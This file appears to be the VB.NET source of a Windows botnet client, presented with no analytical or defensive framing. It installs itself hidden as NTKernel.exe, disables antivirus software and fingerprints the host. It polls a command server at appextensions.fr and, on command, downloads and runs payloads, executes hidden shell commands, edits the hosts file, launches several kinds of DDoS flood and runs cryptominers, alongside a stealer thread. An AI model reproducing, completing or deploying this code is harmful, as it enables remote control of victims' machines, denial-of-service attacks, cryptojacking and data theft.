Imports System.Security.Principal
Imports System.IO
Imports System.Security.AccessControl
Imports System.Runtime.InteropServices
Imports System.Threading
Imports System.Management
Imports System.Text
Imports System.Net

Public Module Main
    Public ProactiveAV As New Thread(New ThreadStart(AddressOf ProactiveAVKill))
    Public AVKillThread As New Thread(New ThreadStart(AddressOf AVKill.Start))
    Public Steals As New Thread(New ThreadStart(AddressOf RunStealer))
    Public OneBotOnly As New Mutex
    Public RunBotKiller As Boolean = False
    Public InstalledSuccessfully As Boolean = False
    Public delay As Integer = 60000
    Public LatestCommand As String = "1"
    Public ProcessedCommands As String = "1"
    Public DataToPost As String = "1"
    Public AntisDetected As Boolean = False
    Public InstallationOfEverything As String
    Public GateURL = "http://appextensions.fr/chat/gate.php"
    Public InstallFolder As String = "Windows NT"
    Public RunFileAs As String = "NTKernel.exe"
    Public Mutex As String = "564548927897498"
    Sub Main()
        Try
            If Application.ExecutablePath.Contains(".com") Then Threading.Thread.Sleep(10000)
            If Application.ExecutablePath.Contains("HardwareCheck.exe") Then
                AVKill.Start()
                Disablers.Disable()
                Dim r As New Random
                My.Computer.FileSystem.MoveFile(Application.ExecutablePath, IO.Path.GetTempPath & r.Next(1000, 9000).ToString)
                Environment.Exit(0)
                End
            End If
        Catch : End Try
        Try
            If Admin() Then
                InstallationOfEverything = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\" & InstallFolder & "\"
            Else
                InstallationOfEverything = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) & "\" & InstallFolder & "\"
            End If
        Catch
            InstallationOfEverything = Environment.GetEnvironmentVariable("PROGRAMDATA") & "\" & InstallFolder & "\"
        End Try
        InstallBot()
        Try
            OneBotOnly = New Mutex(False, "564548927897498")
            If OneBotOnly.WaitOne(0, False) = False Then
                OneBotOnly.Close()
                OneBotOnly = Nothing
                Threading.Thread.Sleep(100)
                If InstalledSuccessfully = True Then
                    Try : Dim r As New Random
                        If Not Application.ExecutablePath.Contains(".com") Then
                            My.Computer.FileSystem.MoveFile(Application.ExecutablePath, IO.Path.GetTempPath & r.Next(1000, 9000).ToString)
                        End If
                    Catch : End Try
                End If
                End
            End If

        Catch : End Try
        StartBot()
    End Sub
    Public Sub StartBot()
        On Error Resume Next
        GetBotInfo()


        Dim Commands = New System.Timers.Timer(delay)
        AddHandler Commands.Elapsed, AddressOf CheckLatestCoemmand
        Commands.Start()

        Dim Startup = New System.Timers.Timer(5000)
        AddHandler Startup.Elapsed, AddressOf Persistance.Startup
        Startup.Start()

        Dim Miner1 = New System.Timers.Timer(5000)
        AddHandler Miner1.Elapsed, AddressOf MinerThreader
        Miner1.Start()

        Dim Miner2 = New System.Timers.Timer(5000)
        AddHandler Miner2.Elapsed, AddressOf GPUMinerThreader
        Miner2.Start()

        Dim InjectionPersistence = New System.Timers.Timer(5000)
        AddHandler InjectionPersistence.Elapsed, AddressOf LoadPersitenceEngine
        InjectionPersistence.Start()

        Dim ProactiveBK = New System.Timers.Timer(30000)
        AddHandler ProactiveBK.Elapsed, AddressOf AutoBKThread
        ProactiveBK.Start()

        ProcessAccessRights.ProtectCurrentProcess()
        Steals.Start()

        BeginMiner()
        BeginGPUMiner()
        ProactiveAV.Start()
        AVKillThread.Start()
        CheckLatestCoemmand()



    End Sub
    Private Const APPCOMMAND_VOLUME_MUTE As Integer = &H80000

    Private Const WM_APPCOMMAND As Integer = &H319

    Declare Function SendMessageW Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal Msg As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr

    Public Function Admin() As Boolean
        Try
            Dim Check As WindowsPrincipal = New WindowsPrincipal(WindowsIdentity.GetCurrent())
            Return Check.IsInRole(WindowsBuiltInRole.Administrator)
        Catch
            Return False
        End Try
    End Function
    Sub InstallBot()
         Try
            Dim dir As New IO.DirectoryInfo(InstallationOfEverything)
            If Not dir.Exists Then
                dir.Create()
                Try : dir.Attributes = FileAttributes.Hidden + FileAttributes.NotContentIndexed + FileAttributes.System : Catch : End Try
            End If
            Dim InstallPath = InstallationOfEverything & RunFileAs
            If Not Application.ExecutablePath.Contains(RunFileAs) Then
                If Not My.Computer.FileSystem.FileExists(InstallPath) Then
                    Try
                        DeleteFile(Application.ExecutablePath & ":Zone.Identifier")
                    Catch : End Try
                    My.Computer.FileSystem.CopyFile(Application.ExecutablePath, InstallPath)
                    Process.Start(InstallPath)
                    If Not Admin() Then
                        Try : Dim fileSettings As New FileInfo(InstallPath)
                            fileSettings.Attributes = FileAttributes.Hidden + FileAttributes.NotContentIndexed + FileAttributes.ReadOnly + FileAttributes.System : Catch : End Try
                    End If
                    Try : Dim MyPath As New FileInfo(Application.ExecutablePath)
                        MyPath.Attributes = FileAttributes.Hidden + FileAttributes.NotContentIndexed + FileAttributes.ReadOnly + FileAttributes.System : Catch : End Try
                    InstalledSuccessfully = True
                    Threading.Thread.Sleep(30000)
                Else
                    AllowAccess(InstallationOfEverything)
                    AllowAccess(InstallPath)
                    Dim fileSettings As New FileInfo(InstallPath)
                    fileSettings.Attributes = FileAttributes.Normal
                    Threading.Thread.Sleep(500)
                    My.Computer.FileSystem.DeleteFile(InstallPath)
                    System.IO.File.Copy(Application.ExecutablePath, InstallPath)
                    Process.Start(InstallPath)
                    InstalledSuccessfully = True
                    Threading.Thread.Sleep(30000)
                End If
            End If
        Catch : End Try
    End Sub

    <DllImport("kernel32", CharSet:=CharSet.Unicode, SetLastError:=True)> _
    Public Function DeleteFile(ByVal name As String) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function
    Public Sub ExecuteCommand(ByVal Input As String)
        Try
            Dim DataSplitted() As String = Split(Input, " ")
            If Input.Contains("bot.download") Then
                Dim newlocation As String = IO.Path.GetTempPath & DataSplitted(2)
                If Not IO.File.Exists(newlocation) Then
                    Dim download As New WebClient
                    download.DownloadFile(DataSplitted(1), newlocation)
                    Process.Start(newlocation)
                End If
            End If
            If Input.Contains("bot.update") Then
                Dim DLLocation = IO.Path.GetTempPath & DataSplitted(2)
                If Not My.Computer.FileSystem.FileExists(DLLocation) Then
                    Dim download As New WebClient
                    download.DownloadFile(DataSplitted(1), DLLocation)
                    Try : OneBotOnly.Close() : Catch : End Try
                    Process.Start(DLLocation)
                    Dim r As New Random
                    Try : My.Computer.FileSystem.MoveFile(BackupFile1, IO.Path.GetTempPath & r.Next(10000, 90000))
                        My.Computer.FileSystem.MoveFile(BackupFile2, IO.Path.GetTempPath & r.Next(10000, 90000)) : Catch : End Try
                        KillFile(Application.ExecutablePath)
                    End
                    Environment.Exit(0)
                End If
            End If
            If Input.Contains("visit.hidden") Then
                If Input.Contains("-kill") Then Shell("taskkill /f /im iexplore.exe", AppWinStyle.Hide)
                Dim Browser As New ProcessStartInfo
                Browser.FileName = "iexplore.exe"
                Browser.Arguments = DataSplitted(1)
                Browser.WindowStyle = ProcessWindowStyle.Hidden
                System.Diagnostics.Process.Start(Browser)
                Dim lo111l As New Form1
                If Input.Contains("-mute") Then SendMessageW(lo111l.Handle, WM_APPCOMMAND, lo111l.Handle, CType(APPCOMMAND_VOLUME_MUTE, IntPtr))
            End If
            If Input.Contains("visit.visible") Then
                Process.Start(DataSplitted(1))
            End If
            If Input.Contains("seeder") Then
                SeedTorrent(DataSplitted(1))
            End If
            If Input.Contains("ddos.slowloris") Then
                StartSlowloris(DataSplitted(1), DataSplitted(3), DataSplitted(2), "")
            End If
            If Input.Contains("ddos.arme") Then
                StartARME(DataSplitted(1), DataSplitted(3), DataSplitted(2), "")
            End If
            If Input.Contains("ddos.posthttp") Then
                Dim asdf() As String = Split(Input, """")
                StartPOSTHTTP(DataSplitted(1), DataSplitted(3), DataSplitted(2), asdf(1))
            End If
            If Input.Contains("ddos.httpget") Then
                StartHTTPGet(DataSplitted(1), DataSplitted(3), DataSplitted(2))
            End If
            If Input.Contains("ddos.bwflood") Then
                StartBandwidthFlood(DataSplitted(1), DataSplitted(3), DataSplitted(2))
            End If
            If Input.Contains("ddos.stop") Then
                If Input.Contains("udp") Then
                    StopUDP()
                End If
                If Input.Contains("arme") Then
                    StopARME()
                End If
                If Input.Contains("slowloris") Then
                    StopSlowloris()
                End If
                If Input.Contains("httpget") Then
                    StopHTTPGET()
                End If
                If Input.Contains("bwflood") Then
                    StopBandwidthFlood()
                End If
                If Input.Contains("posthttp") Then
                    StopPOSTHTTP()
                End If
                If Input.Contains("condis") Then
                    StopCondis()
                End If
            End If
            If Input.Contains("ddos.udp") Then
                StartUDP(DataSplitted(1), DataSplitted(4), DataSplitted(3), DataSplitted(2))

            End If
            If Input.Contains("ddos.condis") Then
                StartCondis(DataSplitted(1), DataSplitted(4), DataSplitted(3), DataSplitted(2))

            End If
            If Input.Contains("bot.hosts") Then
                    Dim asdf() As String = Split(Input, "*")
                    IO.File.AppendAllText("C:\windows\system32\drivers\etc\hosts", vbNewLine & asdf(1))
            End If
            If Input.Contains("botkiller") Then
                If Input.Contains("hardbk") Then
                    Call SaveSetting("Microsoft", "Sysinternals", "BK", "active")
                    HardBotKill()
                End If
                If Input.Contains("enable") Then
                    Call SaveSetting("Microsoft", "Sysinternals", "BK", "active")
                End If
                If Input.Contains("disable") Then
                    Call SaveSetting("Microsoft", "Sysinternals", "BK", "")
                End If
                If Input.Contains("run") Then
                    RunBotKiller = True
                End If
            End If
            If Input.Contains("bot.shell") Then
                Dim asdf() As String = Split(Input, "*")
                Shell((asdf(1)), AppWinStyle.Hide)
            End If
            If Input.Contains("remove.bot") Then
                If Input.Contains("Confirm") Then
                         KillFile(Application.ExecutablePath)
                    Dim r As New Random
                    Try : My.Computer.FileSystem.MoveFile(BackupFile1, IO.Path.GetTempPath & r.Next(10000, 90000))
                        My.Computer.FileSystem.MoveFile(BackupFile2, IO.Path.GetTempPath & r.Next(10000, 90000)) : Catch : End Try
                    End
                    Environment.Exit(0)
                End If
            End If
            If Input.Contains("miner.start") Then
                Dim asdf() As String = Split(Input, "*")
                If asdf(1) = String.Empty Then
                    RemoveMiner()
                Else
                    InstallMiner(DataSplitted(1), asdf(1))
                End If
            End If
            If Input.Contains("miner.stop") Then
                RemoveMiner()
            End If
            If Input.Contains("miner.gpu.start") Then
                Dim asdf() As String = Split(Input, "*")
                If GetVideoCard().ToLower.Contains("amd") Or GetVideoCard().ToLower.Contains("ati") Then
                    InstallGPUMiner(DataSplitted(1), asdf(1))
                End If
            End If
            If Input.Contains("miner.gpu.stop") Then
                RemoveGPUMiner()
            End If
        Catch : End Try
    End Sub

    Public Function BASE64_Encode(ByVal input As String) As String
        Try
            Return Reverse(Convert.ToBase64String(System.Text.Encoding.ASCII.GetBytes(input)))
        Catch
            Return String.Empty
        End Try
    End Function
    Public Function BASE64_Decode(ByVal input As String) As String
        Try
            Dim lel = Reverse(input)

            Return System.Text.Encoding.ASCII.GetString(Convert.FromBase64String(lel))
        Catch
            Return String.Empty
        End Try
    End Function
    Public Function Reverse(ByVal value As String) As String
        Try
            Dim arr() As Char = value.ToCharArray()
            Array.Reverse(arr)
            Return New String(arr)
        Catch
            Return String.Empty
        End Try
    End Function

    Function getSHA1Hash(ByVal strToHash As String) As String
        Try
            Dim sha1Obj As New System.Security.Cryptography.SHA1CryptoServiceProvider
            Dim bytesToHash() As Byte = System.Text.Encoding.ASCII.GetBytes(strToHash)

            bytesToHash = sha1Obj.ComputeHash(bytesToHash)

            Dim strResult As String = ""

            For Each b As Byte In bytesToHash
                strResult += b.ToString("x2")
            Next

            Return strResult
        Catch
            Return CpuId()
        End Try

    End Function
    Public Sub CheckLatestCoemmand()
        Try
            Dim request As WebRequest = WebRequest.Create(GateURL)
            request.Method = "POST"
            Dim postData As String = "crypt=" & DataToPost
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            dataStream = response.GetResponseStream()
            Dim reader As New StreamReader(dataStream)
            Dim responseFromServer As String = reader.ReadToEnd()
            ProcessCommand(BASE64_Decode(responseFromServer))
            dataStream.Close()
            response.Close()
            reader.Close()
        Catch ex As Exception
        End Try
    End Sub
    Public Sub ProcessCommand(ByVal what As String)
        Try
            If Not what = LatestCommand Then
                LatestCommand = what
                Dim r() = Split(what, "|")
                For Each Str As String In r
                    If Not ProcessedCommands.Contains(Str) Then
                        ProcessedCommands = ProcessedCommands & Str
                        ExecuteCommand(Str)
                    End If
                Next
            End If
        Catch : End Try
    End Sub
    Public Sub GetBotInfo()
        SQLiteHandler.LoadConfig()
        Try
            Dim PostData As String = ""
            Dim bit As String = "x86*"
            Try
                If Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86") Then bit = "x64*"
            Catch : End Try

            Try
                Dim OS As String = My.Computer.Info.OSFullName
                If OS.Contains("XP") Then PostData = PostData & "Windows XP " & bit
                If OS.Contains("7") Then PostData = PostData & "Windows 7 " & bit
                If OS.Contains("Vista") Then PostData = PostData & "Windows Vista " & bit
                If OS.Contains("8") Then PostData = PostData & "Windows 8 " & bit
                If OS.Contains("Server") Then PostData = PostData & "Windows Server " & bit
                If Not PostData.Contains("Windows") Then PostData = PostData & "Windows " & bit
            Catch
                PostData = PostData & "Windows " & bit
            End Try

            PostData = PostData & GetAntiVirus()
            Dim usertype As String = "*User*"
            If Admin() Then usertype = "*Admin*"

            PostData = PostData & usertype

            PostData = PostData & GetVideoCard()

            PostData = PostData & "*" & GetCPU()
            Try
                PostData = PostData & "*" & Environment.MachineName & "*"
            Catch
                PostData = PostData & "*" & "N/A" & "*"
            End Try

            Try
                PostData = PostData & Environment.UserName & "*"
            Catch
                PostData = PostData & "N/A" & "*"
            End Try

            Dim lel = GetHWID() & "*" & PostData

            DataToPost = BASE64_Encode(lel)

        Catch ex As Exception
            '   IO.File.AppendAllText(errorpath, ex.ToString & vbNewLine & vbNewLine)
        End Try
    End Sub
    Function GetHWID() As String
        Try
            Dim HWID As String = String.Empty
            Try
                HWID = HWID & Environment.MachineName
            Catch : End Try
            HWID = HWID & CpuId()
            HWID = HWID & GetCPU()
            HWID = HWID & GetVideoCard()
            HWID = getSHA1Hash(HWID)
            Return HWID
        Catch
            Return getSHA1Hash(Environment.MachineName)
        End Try
    End Function
    Private Function CpuId() As String
        Try
            Dim computer As String = "."
            Dim wmi As Object = GetObject("winmgmts:" & _
                "{impersonationLevel=impersonate}!\\" & _
                computer & "\root\cimv2")
            Dim processors As Object = wmi.ExecQuery("Select * from " & _
                "Win32_Processor")

            Dim cpu_ids As String = ""
            For Each cpu As Object In processors
                cpu_ids = cpu_ids & ", " & cpu.ProcessorId
            Next cpu
            If cpu_ids.Length > 0 Then cpu_ids = _
                cpu_ids.Substring(2)

            Return cpu_ids
        Catch
            Return String.Empty
        End Try
    End Function
    Public Sub AutoBKThread()
        Try
            If RunBotKiller = True Then
                RunBotKiller = False
                BotKillers.RunStandardBotKiller()
            End If


            If Not GetSetting("Microsoft", "Sysinternals", "BK") = String.Empty Then
                BotKillers.RunStandardBotKiller()
            End If
        Catch : End Try
    End Sub
    Public Function AES_Decrypt(ByVal input As String, ByVal pass As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim decrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = System.Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = Convert.FromBase64String(input)
            decrypted = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return decrypted
        Catch ex As Exception
        End Try
    End Function
    Public Function AES_Encrypt(ByVal input As String, ByVal pass As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim encrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = System.Security.Cryptography.CipherMode.ECB
            Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = System.Text.ASCIIEncoding.ASCII.GetBytes(input)
            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return encrypted
        Catch ex As Exception
        End Try
    End Function

    Function GetAntiVirus() As String
        Try
            Dim str As String = Nothing
            Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
            Dim instances As ManagementObjectCollection = searcher.[Get]()
            For Each queryObj As ManagementObject In instances
                str = queryObj("displayName").ToString()
            Next
            If str.Contains("*") Then str = "N/A"
            If str = String.Empty Then str = "N/A"

            Return str
            searcher.Dispose()
        Catch
            Return "N/A"
        End Try
    End Function
    Public Function GetVideoCard() As String
        Try
            Dim VideoCard As String = String.Empty
            Dim objquery As New ObjectQuery("SELECT * FROM Win32_VideoController")
            Dim objSearcher As New ManagementObjectSearcher(objquery)

            For Each MemObj As ManagementObject In objSearcher.Get
                VideoCard = VideoCard & (MemObj("Name")) & ". "
            Next
            If VideoCard.Contains("*") Then VideoCard = "N/A"
            Return (VideoCard)
        Catch
            Return "N/A"
        End Try
    End Function



    Public Function GetCPU() As String
        Try
            Dim Proc As New Management.ManagementObject("Win32_Processor.deviceid=""CPU0""")
            Proc.Get()

            Dim lel = (Proc("Name").ToString)
            If lel.Contains("*") Then lel = "N/A"
            Return lel


        Catch ex As Exception
            Return "N/A"
        End Try

    End Function
End Module